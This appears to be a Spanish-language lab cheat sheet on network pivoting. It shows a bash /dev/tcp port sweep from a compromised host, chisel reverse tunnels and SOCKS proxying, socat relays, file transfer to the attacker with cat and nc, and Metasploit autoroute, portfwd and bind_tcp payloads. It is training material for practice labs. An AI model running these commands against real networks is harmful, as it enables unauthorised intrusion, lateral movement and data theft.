
----

## Manual
----
>Jugaremos con 5 machines

- Red 

>Empezamos

- Arp-scan debería salir sólo 1 
- Importante escanear si es linux o windows o lo que corresponda

>Enumeramos puertos desde una máquina vulnerada

```bash
#!/bin/bash

for i in $(seq 1 254); do
	for port in 21 22 80 443 445 8080; do
		timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.$i/$port" &>/dev/null && echo "[+] Host 10.10.0.$i - PORT $port - OPEN| &

	done
done; wait
```

- Una vez ganado aceso, compartir chisel a maquina victima
```bash
scp chisel user@ip:/tmp/chisel
```

- Cuidado de **que no coincidan los puertos** del túnel con **otros servicios o reverse shells corriendo**

1. Llegar a una IP

> Atacante
```bash
chisel server --reverse -p 1234
``` 

> Victim, quiero que el puerto **80 de la víctima** sea **mi puerto 80**
```bash
chisel client IPAtaque:1234 R:80:IpVictim:80
```

2. Llegar a todo el segmento de red

> Atacante
```bash
chisel server --reverse -p 1234
``` 
- Configuramos **/etc/proxychains4.conf**
```bash
nano /etc/proxychains4.conf
socks5 127.0.0.1 1080
#Chisel abre el puerto por defecto 1080
```
- Ahora pasamos con nmap por el túnel
```bash
proxycahins4 nmap -sT -Pn -n IP 2>/dev/null # probas con -sS 
```
- Con **gobuster**
```bash
gobuster -w wordlist http://IP --proxy socks5://127.0.0.1:1080
```

> Victim
1. Si quiero ver todo el segmento de red de la **2 vícitima**
```bash
chisel client IPAtaque:1234 R:socks #Si no funciona socks5
```
2. Si quiero el puerto 443 de la victima por udp
```bash
chisel client IPAtaque:1234 R:443:IpVictim:443/udp
```



>Ahora si queremos hacer una petición desde la víctima

Nos descargamos **chisel** y se lo pasamos a la victima
- Victim
>Básicamente decimos, eh tú, todo lo que venga por el 4343, redirígelo a esa **IP:Port**
```bash
./socat TCP-LISTEN:4343,fork TCP:IPATACANTE:80
```
- Desde la víctima, podemos ver el **archivo.txt** qu etenemos en la maquina atacante
```bash
curl http://ipPrimeraVictima:4343/archivo.txt
```

- transferir archivos de una máquina a otra
```bash
./socat TCP-LISTEN:4343,fork TCP:IPATACANTE:1234
cat < archivazo > /dev/tco/IPAtacante/4343
nc -nvlp 1234 > archivazo
```


- Cuándo queremos llegar a una 3 máquina

1. Le pasamos **chisel.exe** a la máquina windows, que es la 3º
```bash
smbserver.py smbFolder /home/usuario -smb2support
```
2. Desde la windows, ya que tenemos varios túneles
```bat
copy \\IP\smbFolder\chisel.exe chisel.exe
```
3. Ya **teníamos 1 server de chisel** corriendo y **2 clients**
```bash
# Atacante
chisel server --reverse -p 1234

# 1 máquina
chisel client IPAtaque:1234 R:socks

# 2 máquina
chisel client IPMAquinaComprometida1:1234 R:socks R:443:IpVictim1:443/udp

# 3 máquna Windows
chisel client IPMAquinaComprometida2:1234 R:socks R:443:IpVictim1:443/udp
```


## Metasploit

1. Si comprometemos, sólo podremos **escanear desde dentro de metasploit**
- Al comprometer runa máquina añadiremos Rutas
```bash
meterpreter> run autoroute -s DirRed/Mascara
# renombramos las sesiones para que nos queden claras las redes
sessions -n Red1-Victim1 -i 1
```
- Scanner **TCP**
```bash

use scanner/portscan/tcp
set rhosts IPVictim2
set PORTS 0-65535
exploit
```
- Para **forwarding** 
> **-l:** Especificamos el puerto de la máquina atacante
    **-p:** Especificamos el port de la vítcima
     **-r:** Especifico la áquina Víctima
 
```bash
meterpreter>portfwd add -l 1234 -p 80 -r IPVictim2
```

- Escaneamos por el puerto dónde reenviamos, a ver que info de cada port
```bash
db_nmap -sS -sV -p 1234 localhost
```

 - Explotación
 >Abremos bind_shell y la víctima abre el Peuerto esperando conexiones

```bash
use elexploit que sea en ese puerto 80
set payload /windows/meterpreter/bind_tcp